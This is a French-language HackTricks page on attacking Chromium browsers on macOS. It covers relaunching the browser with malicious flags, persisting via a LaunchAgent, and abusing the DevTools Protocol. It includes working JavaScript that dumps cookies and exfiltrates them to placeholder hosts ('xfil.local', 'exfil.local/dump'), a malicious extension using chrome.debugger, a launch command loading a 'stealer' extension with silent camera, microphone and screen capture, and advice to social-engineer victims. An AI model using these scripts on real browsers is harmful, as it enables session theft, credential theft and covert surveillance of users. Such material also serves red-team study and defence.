# Injection Chromium sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Les navigateurs basés sur Chromium, comme Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi et Opera, utilisent les mêmes switches en ligne de commande, fichiers de préférences et interfaces d'automatisation DevTools. Sur macOS, tout utilisateur ayant accès à l'interface graphique peut terminer une session de navigateur existante et la rouvrir avec des flags, extensions ou endpoints DevTools arbitraires qui s'exécutent avec les entitlements de la cible.

#### Lancer Chromium avec des flags personnalisés sur macOS

macOS conserve une seule instance UI par profil Chromium, donc l'instrumentation nécessite normalement de forcer la fermeture du navigateur (par exemple avec `osascript -e 'tell application "Google Chrome" to quit'`). Les attaquants relancent typiquement via `open -na "Google Chrome" --args <flags>` pour injecter des arguments sans modifier le bundle de l'application. Envelopper cette commande dans un LaunchAgent utilisateur (`~/Library/LaunchAgents/*.plist`) ou un login hook garantit que le navigateur altéré est relancé après un reboot/déconnexion.

#### `--load-extension` Flag

Le flag `--load-extension` charge automatiquement des extensions non empaquetées (chemins séparés par des virgules). Associez-le à `--disable-extensions-except` pour bloquer les extensions légitimes tout en forçant l'exécution uniquement de votre payload. Des extensions malveillantes peuvent demander des permissions à fort impact telles que `debugger`, `webRequest` et `cookies` pour pivoter vers les protocoles DevTools, modifier les en-têtes CSP, rétrograder HTTPS, ou exfiltrer des éléments de session dès le démarrage du navigateur.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Ces switches exposent le Chrome DevTools Protocol (CDP) sur TCP ou via un pipe afin que des outils externes puissent piloter le navigateur. Google a observé un usage massif par des infostealer de cette interface et, à partir de Chrome 136 (mars 2025), les switches sont ignorés pour le profil par défaut à moins que le navigateur soit lancé avec un `--user-data-dir` non standard. Cela applique App-Bound Encryption sur les profils réels, mais les attaquants peuvent toujours créer un profil neuf, contraindre la victime à s'authentifier dedans (phishing/assistance triage), et récolter cookies, tokens, device trust states ou enregistrements WebAuthn via CDP.

#### `--user-data-dir` Flag

Ce flag redirige l'intégralité du profil du navigateur (History, Cookies, Login Data, Preference files, etc.) vers un chemin contrôlé par l'attaquant. Il est obligatoire lors de la combinaison des builds récentes de Chrome avec `--remote-debugging-port`, et il isole aussi le profil altéré afin que vous puissiez déposer des fichiers `Preferences` ou `Secure Preferences` pré-remplis qui désactivent les dialogues de sécurité, installent automatiquement des extensions et modifient les schémas par défaut.

#### `--use-fake-ui-for-media-stream` Flag

Ce switch contourne la demande d'autorisation caméra/micro afin que toute page appelant `getUserMedia` obtienne immédiatement l'accès. Combinez-le avec des flags comme `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, ou les commandes CDP `Browser.grantPermissions` pour capturer silencieusement audio/vidéo, partager l'écran, ou satisfaire les vérifications de permission WebRTC sans interaction utilisateur.

## Débogage distant et abus du DevTools Protocol

Une fois Chrome relancé avec un `--user-data-dir` dédié et `--remote-debugging-port`, vous pouvez vous connecter via CDP (par ex. via `chrome-remote-interface`, `puppeteer` ou `playwright`) et automatiser des workflows à haute privilège :

- **Vol de cookies/sessions :** `Network.getAllCookies` et `Storage.getCookies` renvoient des valeurs HttpOnly même lorsque App-Bound encryption bloquerait normalement l'accès au système de fichiers, car CDP demande au navigateur en cours d'exécution de les déchiffrer.
- **Altération des permissions :** `Browser.grantPermissions` et `Emulation.setGeolocationOverride` permettent de contourner les prompts caméra/micro (surtout combinés avec `--use-fake-ui-for-media-stream`) ou de falsifier les vérifications de sécurité basées sur la localisation.
- **Injection de frappes/scripts :** `Runtime.evaluate` exécute du JavaScript arbitraire dans l'onglet actif, permettant la récupération d'identifiants, le patching du DOM, ou l'injection de beacons de persistance qui survivent aux navigations.
- **Exfiltration en direct :** `Network.webRequestWillBeSentExtraInfo` et `Fetch.enable` interceptent les requêtes/réponses authentifiées en temps réel sans toucher aux artefacts disque.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Parce que Chrome 136 bloque CDP sur le profil par défaut, le fait de copier/coller le répertoire existant de la victime `~/Library/Application Support/Google/Chrome` vers un staging path ne fournit plus de cookies décryptés. À la place, social-engineer l'utilisateur pour qu'il s'authentifie dans le profil instrumenté (p.ex. une session de support "helpful") ou capturez les MFA tokens en transit via des network hooks contrôlés par CDP.

## Injection basée sur les extensions via Debugger API

La recherche 2023 "Chrowned by an Extension" a démontré qu'une extension malveillante utilisant l'API `chrome.debugger` peut se rattacher à n'importe quel onglet et obtenir les mêmes capacités DevTools que `--remote-debugging-port`. Cela brise les hypothèses d'isolation originales (les extensions restent dans leur contexte) et permet :

- Vol silencieux de cookies et d'identifiants via `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modification des permissions de site (caméra, microphone, géolocalisation) et contournement des interstitiels de sécurité, permettant aux pages de phishing d'imiter les dialogues de Chrome.
- Altération on-path des avertissements TLS, des téléchargements ou des invites WebAuthn en pilotant de manière programmatique `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, ou `Security.handleCertificateError`.

Chargez l'extension avec `--load-extension`/`--disable-extensions-except` pour qu'aucune interaction utilisateur ne soit requise. Un script d'arrière-plan minimal qui arme l'API ressemble à ceci :
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
L'extension peut aussi s'abonner aux événements `Debugger.paused` pour lire des variables JavaScript, modifier des scripts inline ou placer des breakpoints personnalisés qui persistent après la navigation. Parce que tout s'exécute dans la session GUI de l'utilisateur, Gatekeeper et TCC ne sont pas déclenchés, ce qui rend cette technique idéale pour un malware qui a déjà réussi à s'exécuter dans le contexte de l'utilisateur.

### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatise les lancements de Chromium avec des payload extensions et expose des hooks CDP interactifs.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Outillage similaire axé sur l'interception du trafic et l'instrumentation du navigateur pour les opérateurs macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Bibliothèque Node.js pour automatiser des dumps du Chrome DevTools Protocol (cookies, DOM, permissions) une fois qu'une instance `--remote-debugging-port` est en écoute.

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Trouvez plus d'exemples dans les liens des outils.

## Références

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
